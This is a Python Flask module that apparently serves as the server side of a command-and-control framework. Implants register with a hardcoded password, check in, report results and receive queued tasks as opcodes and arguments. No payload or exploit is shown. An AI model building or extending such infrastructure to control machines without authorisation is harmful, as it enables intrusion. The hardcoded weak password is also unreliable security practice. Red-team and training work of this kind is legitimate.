from flask import Blueprint, request , abort 
from speedrun.implant_pb2 import * 
from speedrun.db import db
from speedrun.models import make_implant_from_request, handle_task_complete, get_task_for_implant, opcodes
rpc = Blueprint("rpc", __name__)


password = "12345"

@rpc.route("/register", methods=["POST"])
def handle_register():
    register = Register()
    req_data = request.get_data()
    register.ParseFromString(req_data)
    if register.Password != password:
        print("Invalid Password")
        abort(404)
    print(register)

    r = make_implant_from_request(register)
    print(r)

    print("New Implant connected!")
    return "ok"

@rpc.route("/checkin", methods = ["POST"])
def handle_checkin():
    checkin =  Checkin()
    data = request.get_data()
    checkin.ParseFromString(data)
    if checkin.Resp:
        print("Checkin Response: ", checkin.Resp)
        result = handle_task_complete(checkin.GUID, checkin.Resp)
        print("Implant checkin status: ", result)
    

    task = get_task_for_implant(checkin.GUID) 
    if task :
        print(f"Task pulled down for implant: {task}")
        tr = TaskRequest()
        tr.TaskGuid  = task.task_id
        tr.Opcode  = opcodes[task.task_opcode]
        tr.Args = task.task_args
        return  tr.SerializeToString()
    # handle job response 
    # handle new tasks 
    
    return ""

    
@rpc.route("/testpb", methods=["POST"])
def handle_pbtest():
    register = Register()
    req_data = request.get_data()
    register.ParseFromString(req_data)
    print(register)
    return ""

